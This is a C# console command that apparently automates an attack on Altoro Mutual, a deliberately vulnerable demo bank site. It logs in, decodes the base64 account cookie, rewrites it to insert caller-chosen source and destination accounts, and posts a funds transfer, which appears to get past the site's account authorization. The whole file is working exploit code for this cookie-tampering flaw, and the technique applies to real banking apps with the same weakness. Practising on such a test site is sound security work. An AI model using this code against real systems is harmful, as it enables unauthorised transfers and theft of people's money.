using System.Net;
using Microsoft.Extensions.Logging;

public interface IAccount
{
    Task<(bool successful, string details)> TransferFundsAsync(string username, string password, string fromAccountNumber, string fromAccountType, string toAccountNumber, string toAccountType, double amount);
}

public class Account : ConsoleAppBase, IAccount
{
    private readonly IAuthentication _auth;
    private readonly ILogger<Account> _logger;

    public Account(IAuthentication auth, ILogger<Account> logger)
    {
        _auth = auth;
        _logger = logger;
    }

    [Command("transfer", "Transfer funds between accounts")]
    public async Task<(bool successful, string details)> TransferFundsAsync(
        [Option("u", "Username")] string username,
        [Option("p", "Password")] string password,
        [Option("fn", "From Account Number")] string fromAccountNumber,
        [Option("ft", "From Account Type")] string fromAccountType,
        [Option("tn", "To Account Number")] string toAccountNumber,
        [Option("tt", "To Account Type")] string toAccountType,
        [Option("a", "Transfer Amount")] double amount)
    {
        try {

            // Login to Altoro 
            var (successful, cookieContainer) = await _auth.LoginAsync(username, password);
            if (!successful) {
                return (false, "Login Failed");
            }
            
            // Get the Altoro Cookie
            var cookieKey = "AltoroAccounts";
            var altoroCookieValue = cookieContainer.GetAllCookies()
            .Cast<Cookie>()
            .Where(c => c.Name == cookieKey)
            .Select(c => c.Value)
            .FirstOrDefault();

            if (string.IsNullOrEmpty(altoroCookieValue)) {
                _logger.LogError("TransferFundsAsync AltoroAccounts cookie not in cookie jar");
                return (false, "AltoroAccounts cookie not in cookie jar");
            }

            // Create the updated cookie value required for the transfer
            var accountTransferCookie = CreateTransferCookieValue(altoroCookieValue, fromAccountNumber, fromAccountType, toAccountNumber, toAccountType);

            if (string.IsNullOrEmpty(accountTransferCookie)) {
                return (false, "Possible unexpected cookie value. Check the logs for more information");
            }

            var (updatedCookieSuccesful, updatedCookieContainer) = UpdateCookieVaule(cookieContainer, cookieKey, accountTransferCookie);

            if (!updatedCookieSuccesful) {
                return (false, "Unable to update cookie value. Check the logs for more information");
            }

            // Send the transfer request
            return await MakeTheTransferAsync(updatedCookieContainer, fromAccountNumber, toAccountNumber, amount);
        } catch(Exception ex) {
            _logger.LogCritical("TransferFundsAsync Exception {Message}", ex.Message);
            _logger.LogTrace(ex, "TransferFundsAsync Exception");
            return (false, $"Error: {ex.Message}");
        }
    }

    private async Task<(bool successful, string details)> MakeTheTransferAsync(CookieContainer cookieContainer, string fromAccountNumber, string toAccountNumber, double amount)
    {
        var handler = new HttpClientHandler() {
            CookieContainer = cookieContainer,
            UseCookies = true,
        };
        var httpClient = new HttpClient(handler);

        var uri = "http://demo.testfire.net/bank/doTransfer";
        
        var form = new Dictionary<string, string>();
        form.Add("fromAccount", fromAccountNumber);
        form.Add("toAccount", toAccountNumber);
        form.Add("transferAmount", amount.ToString());
        var httpContent = new FormUrlEncodedContent(form);

        var request = new HttpRequestMessage(HttpMethod.Post, uri) {
            Content = httpContent,
        };
        _logger.LogInformation("MakeTheTransferAsync Sending request to transfer {Amount} from {From} to {To}", amount, fromAccountNumber, toAccountNumber);
        var response = await httpClient.SendAsync(request);
        
        if (response.IsSuccessStatusCode) {
            _logger.LogInformation("MakeTheTransferAsync Request returned 200");
            // TODO: Maybe check the HTML to make sure but for now we'll
            // just hope for the best.
            return (true, "Trasfer request may have succeeded. Check online to be sure");
        }

        _logger.LogError("MakeTheTransferAsync Recieved {Code} : {Message}", response.StatusCode, response.ReasonPhrase);
        return (false, $"Trasfer request failed. {response.ReasonPhrase}");
    }

    private string CreateTransferCookieValue(string currentCookieValue, string fromAccountNumber, string fromAccountType, string toAccountNumber, string toAccountType) {
        // Cookie Style
        // AltoroAccounts= 800000~Corporate~-6.679E27|800001~Checking~6.679E27|
        var sanatizedCookie = currentCookieValue.Replace("\"", "");

        var decodedCookie = DecodeBase64(sanatizedCookie);
        // Split it on the ~ so we can recreate it
        var split = decodedCookie.Split('~');
        if (split.Length < 5) {
            _logger.LogError("CreateTransferCookie Unexpected Cookie String {Cookie}", decodedCookie);
            return "";
        }
        var leftSide = GetLeftSide(split);
        var rightSide = split[4];
        var cookie = $"{toAccountNumber}~{toAccountType}~{leftSide}|{fromAccountNumber}~{fromAccountType}~{rightSide}";
        var encoded = EncodeBase64(cookie);
        return $"{encoded}; Path=/;";
    }

    private string GetLeftSide(string[] split) {
        var partNeeded = split[2];
        var leftSplit = partNeeded.Split('|');
        return leftSplit[0];
    }

    private (bool successful, CookieContainer cookieJar) UpdateCookieVaule(CookieContainer cookieContainer, string cookieName, string cookieValue) {
        var cookies = cookieContainer.GetAllCookies().Cast<Cookie>();
        bool updatedCookie = false;
        foreach(var cookie in cookies) {
            if (cookie.Name == cookieName) {
                cookie.Value = cookieValue;
                updatedCookie = true;
            }
        }

        if (!updatedCookie) {
            _logger.LogError("UpdateCookieValue Cookie Not Found {Name}", cookieName);
            return (false, cookieContainer);
        }

        return (true, cookieContainer);
    }

    private string DecodeBase64(string toDecode) {
        byte[] data = Convert.FromBase64String(toDecode);
        return System.Text.Encoding.UTF8.GetString(data);
    }

    private string EncodeBase64(string toEncode) {
        var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(toEncode);
        return System.Convert.ToBase64String(plainTextBytes);
    }
}